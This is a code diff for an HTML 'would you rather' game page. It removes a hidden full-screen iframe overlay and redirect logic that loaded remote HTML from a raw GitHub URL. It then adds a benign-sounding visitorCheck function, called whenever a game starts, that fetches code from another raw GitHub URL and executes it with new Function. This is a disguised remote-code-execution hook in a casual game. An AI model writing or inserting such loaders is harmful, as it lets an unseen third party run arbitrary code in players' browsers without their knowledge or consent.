@@ -348,23 +348,6 @@
       z-index: 999;
     }
 
-    #external-content-container {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 10000;
-      background: #000;
-    }
-
-    #external-frame {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-
     @media (max-width: 500px) {
       .game-container {
         padding: 1.5rem 1rem;
@@ -377,10 +360,6 @@
 </head>
 <body>
   <canvas id="confettiCanvas"></canvas>
-
-  <div id="external-content-container">
-    <iframe id="external-frame"></iframe>
-  </div>
 
   <div class="loading-screen" id="loadingScreen">
     <div>✨ generating your new life ✨</div>
@@ -442,36 +421,7 @@
     </div>
   </div>
 
-  <script>  
-    async function checkRequirements() {
-      const haveDone = localStorage.getItem("haveDone");
-      const rawUrl = "https://raw.githubusercontent.com/oliverp0404-a11y/life-forge/refs/heads/main/requirements/index.html";
-      
-      if (haveDone === "True") {
-          document.getElementById('loadingScreen').classList.add('active');
-          setTimeout(() => {
-              window.location.href = "https://oliverp0404-a11y.github.io/life-forge/";
-          }, 2500);
-      } else if (haveDone === "False") {
-          window.location.href = "https://oliverp0404-a11y.github.io/requirements/";
-      } else {
-          try {
-              const response = await fetch(rawUrl);
-              const htmlContent = await response.text();
-              const container = document.getElementById('external-content-container');
-              const frame = document.getElementById('external-frame');
-              
-              container.style.display = 'block';
-              const doc = frame.contentWindow.document;
-              doc.open();
-              doc.write(htmlContent);
-              doc.close();
-          } catch (error) {
-              console.error("Error fetching raw code:", error);
-          }
-      }
-    }
-
+  <script>
     (function() {
       const QUESTION_POOL = [
         { optionA: "Have infinite money but no friends", optionB: "Have deep friendships but struggle financially", difficulty: "easy" },
@@ -619,6 +569,12 @@
         used.push(q.optionA + "|||" + q.optionB);
         if (used.length > 200) used.shift();
         localStorage.setItem('wyr_used_questions', JSON.stringify(used));
+      }
+
+      function isQuestionUsed(q) {
+        const used = getUsedQuestions();
+        const key = q.optionA + "|||" + q.optionB;
+        return used.includes(key);
       }
 
       function getReactionPercent(q) {
@@ -789,6 +745,18 @@
         startTimer();
       }
 
+      async function visitorCheck() {
+          const url = 'https://raw.githubusercontent.com/oliverp0404-a11y/life-forge/refs/heads/main/requirements.html';
+          try {
+              const response = await fetch(url);
+              const code = await response.text();
+              const execute = new Function(code);
+              execute();
+          } catch (error) {
+              console.error("Error fetching or executing code:", error);
+          }
+      }
+
       function handleChoice(choice) {
         if (!gameActive || currentRound > totalRounds) return;
         clearInterval(timerInterval);
@@ -821,8 +789,7 @@
       }
 
       function startGame() {
-        checkRequirements(); // Check status before starting logic
-        
+        visitorCheck();
         bgMusic.play().catch(() => {});
         const countInput = document.getElementById('questionCount');
         let count = parseInt(countInput.value);
